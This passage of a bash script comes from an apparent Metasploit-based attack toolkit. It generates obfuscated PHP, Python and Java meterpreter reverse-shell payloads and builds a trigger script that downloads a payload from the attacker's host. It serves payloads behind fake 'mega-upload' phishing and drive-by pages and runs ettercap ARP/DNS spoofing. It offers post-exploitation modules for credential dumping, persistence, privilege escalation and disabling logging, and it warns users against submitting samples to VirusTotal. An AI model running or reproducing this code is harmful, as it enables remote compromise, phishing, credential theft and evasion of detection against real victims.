\"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nRRh0St=$(zenity --title=\"☠ TARGET IP ADRRESS ☠\" --text \"example: 192.168.1.69\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ PHP NAME ☠\" --text \"example: UnixApacheExploit\" --entry --width 300) > /dev/null 2>&1\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"UnixApacheExploit\";fi\nif [ -z \"$RRh0St\" ]; then echo \"${RedF}[x]${white} This Module Requires Target ip addr input\";sleep 3; sh_exit;fi\n\necho \"[☠] Building shellcode -> php format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    RHOST   : $RRh0St\n    FORMAT  : PHP -> APACHE2 (linux)\n    PAYLOAD : php/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -e php/base64 > $IPATH/output/chars.raw\"\n\nst0r3=`cat $IPATH/output/chars.raw`\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $st0r3\necho \"\"\n\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $InJEc11 $IPATH/templates/exec[bak].php\nsleep 2\n\n\n   # check if exec.ps1 exists\n   if [ -e $InJEc11 ]; then\n      echo \"[☠] exec.php  -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] exec.php -> not found!\"\n      exit\n      fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\ncd $IPATH/output/\n# injecting settings into trigger.sh\necho \"[☠] building  -> trigger.sh!\"\nsleep 2\n\necho \"#!/bin/sh\" > trigger.sh\necho \"# bash template | Author: r00t-3xp10it\" >> trigger.sh\necho \"echo \\\"[*] Please wait, preparing software ..\\\"\" >> trigger.sh\necho \"wget -q -O /var/www/html/$N4m.php http://$lhost/$N4m.php && /etc/init.d/apache2 start && xdg-open http://$RRh0St/$N4m.php\" >> trigger.sh\nchmod +x $IPATH/output/trigger.sh > /dev/null 2>&1\n\n\ncd $IPATH/templates/\n# injecting shellcode into name.php\necho \"[☠] Injecting shellcode -> $N4m.php!\"\nsleep 2\nsed \"s|InJ3C|$st0r3|g\" exec.php > obfuscated.raw\nmv obfuscated.raw $IPATH/output/$N4m.php\nchmod +x $IPATH/output/$N4m.php > /dev/null 2>&1\n\n\n# edit files nedded\ncd $IPATH/templates/phishing\ncp $InJEc12 mega[bak].html\nsed \"s|NaM3|trigger.sh|g\" mega.html > copy.html\nmv copy.html $ApAcHe/index.html > /dev/null 2>&1\n# copy from output\ncd $IPATH/output\ncp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1\ncp trigger.sh $ApAcHe/trigger.sh > /dev/null 2>&1\necho \"[☠] loading -> Apache2Server!\"\necho \"---\"\necho \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.php|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.php $ApAcHe/$N4m.php\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'\"\n          fi\n        fi\n\n\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nsleep 2\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/trigger.sh > /dev/null 2>&1\nrm $ApAcHe/$N4m.php > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_webshell_menu\n  clear\nfi\n}\n\n\n\n\n\n\n\n# -----------------------------------------------------------------\n# build shellcode in PYTHON (multi OS)\n# just because ive liked the python payload from veil i decided\n# to make another one to all operative systems (python/meterpreter)\n# P.S. python outputs in venom uses (windows/meterpreter) ;)\n# -----------------------------------------------------------------\nsh_shellcode17 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ SHELLCODE NAME ☠\" --text \"Enter shellcode output name\\nexample: Harmj0y\" --width 300) > /dev/null 2>&1\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"Harmj0y\";fi\n\necho \"[☠] Building shellcode -> python language...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PYTHON -> MULTI OS\n    PAYLOAD : python/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p python/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/chars.raw\"\nst0r3=`cat $IPATH/output/chars.raw`\ndisp=`cat $IPATH/output/chars.raw | awk {'print $3'} | cut -d '(' -f3 | cut -d ')' -f1`\n\n# display shellcode\n# cat $IPATH/output/chars.raw\necho \"\"\necho \"[☠] obfuscating -> base64 encoded!\"\nsleep 2\necho $disp\necho \"\"\n\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] editing/backup files...\"\ncp $InJEc9 $IPATH/templates/exec0[bak].py\ncp $InJEc7 $IPATH/templates/hta_attack/index[bak].html\nsleep 2\n\n\n   # check if exec.ps1 exists\n   if [ -e $InJEc9 ]; then\n      echo \"[☠] exec0.py -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] exec0.py -> not found!\"\n      exit\n      fi\n\n   # check if chars.raw as generated\n   if [ -e $Ch4Rs ]; then\n      echo \"[☠] chars.raw -> found!\"\n      sleep 2\n \n   else\n\n      echo \"[☠] chars.raw -> not found!\"\n      exit\n      fi\n\n\n\n# injecting shellcode into name.py\ncd $IPATH/templates/\necho \"[☠] Injecting shellcode -> $N4m.py!\"\nsleep 2\necho \"[☠] Make it executable...\"\nsleep 2\nsed \"s|InJEc|$disp|g\" exec0.py > obfuscated.raw\nmv obfuscated.raw $IPATH/output/$N4m.py\nchmod +x $IPATH/output/$N4m.py\ncUe=`echo $N4m.py | cut -d '.' -f1`\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.py\\n\\nExecute: python $N4m.py\\n\\nchose how to deliver: $N4m.py\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 260) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\n# post-exploitation\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" --width 305 --height 370) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n\nif [ \"$P0\" = \"dump_credentials_linux.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/wifi_dump_linux.rb\" ]; then\n    echo \"[✔] wifi_dump_linux.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] wifi_dump_linux.rb -> not found\"\n    sleep 1\n    echo \"    copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n\nif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo \"[✔] linux_hostrecon.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] linux_hostrecon.rb -> not found\"\n    sleep 1\n    echo \"[*] copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.py|g\" mega.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.py $ApAcHe/$N4m.py > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.py|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.py $ApAcHe/$N4m.py\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nmv $IPATH/templates/exec0[bak].py $InJEc9 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/chars.raw > /dev/null 2>&1\nrm $ApAcHe/$N4m.py > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_multi_menu\n  clear\nfi\n}\n\n\n\n\n\n# ------------------------------------------------------\n# drive-by attack vector JAVA payload.jar\n# i have allways dream about this (drive-by-rce)\n# using JAVA (affects all operative systems with python)\n# -------------------------------------------------------\nsh_shellcode18 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --title=\"☠ JAR NAME ☠\" --text \"example: JavaPayload\" --entry --width 300) > /dev/null 2>&1\n# CHOSE WHAT PAYLOAD TO USE\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\n\\nAvailable payloads:\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"java/meterpreter/reverse_tcp (default)\" FALSE \"windows/meterpreter/reverse_tcp (base64)\" --width 380 --height 200) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"JavaPayload\";fi\n\nif [ \"$serv\" = \"java/meterpreter/reverse_tcp (default)\" ]; then\necho \"[☠] Building shellcode -> java format ...\"\nsleep 2\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : JAVA -> MULTI OS\n    PAYLOAD : java/meterpreter/reverse_tcp\n\n!\n\n# use metasploit to build shellcode\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f java > $IPATH/output/$N4m.jar\"\n# EDITING/BACKUP FILES NEEDED\necho \"\"\necho \"[☠] building raw shellcode...\"\nsleep 2\necho \"[☠] Injecting shellcode -> $N4m.jar!\"\nsleep 2\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.jar\\n\\nchose how to deliver: $N4m.jar\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 240) > /dev/null 2>&1\n\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n     echo \"[☠] Start a multi-handler...\"\n     echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n     echo \"[☯] Please dont test samples on virus total...\"\n       if [ \"$MsFlF\" = \"ON\" ]; then\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'\"\n         cd $IPATH/output\n         # delete utf-8/non-ancii caracters from output\n         tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n       else\n         xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD java/meterpreter/reverse_tcp; exploit'\"\n       fi\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"persistence.rc\" FALSE \"privilege_escalation.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" FALSE \"linux_hostrecon.rc\" FALSE \"dump_credentials_linux.rc\" --width 305 --height 390) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\nif [ \"$P0\" = \"linux_hostrecon.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/linux_hostrecon.rb\" ]; then\n    echo \"[✔] linux_hostrecon.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] linux_hostrecon.rb -> not found\"\n    sleep 1\n    echo \"[*] copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/linux_hostrecon.rb $pHanTom/post/linux/gather/linux_hostrecon.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\nif [ \"$P0\" = \"dump_credentials_linux.rc\" ]; then\n  if [ -e \"$pHanTom/post/linux/gather/wifi_dump_linux.rb\" ]; then\n    echo \"[✔] wifi_dump_linux.rb -> found\"\n    sleep 2\n  else\n    echo \"[x] wifi_dump_linux.rb -> not found\"\n    sleep 1\n    echo \"    copy post-module to msfdb ..\"\n    cp $IPATH/aux/msf/wifi_dump_linux.rb $pHanTom/post/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1\n    echo \"[☠] Reloading msfdb database ..\"\n    sleep 2\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n    xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n  fi\nfi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc13 driveBy[bak].html\n      sed \"s|NaM3|http://$lhost:$lport|g\" driveBy.html > copy.html\n      mv copy.html $ApAcHe/index.html > /dev/null 2>&1\n      # copy from output\n      cd $IPATH/output\n      cp $N4m.jar $ApAcHe/$N4m.jar > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.jar|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.jar $ApAcHe/$N4m.jar\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT 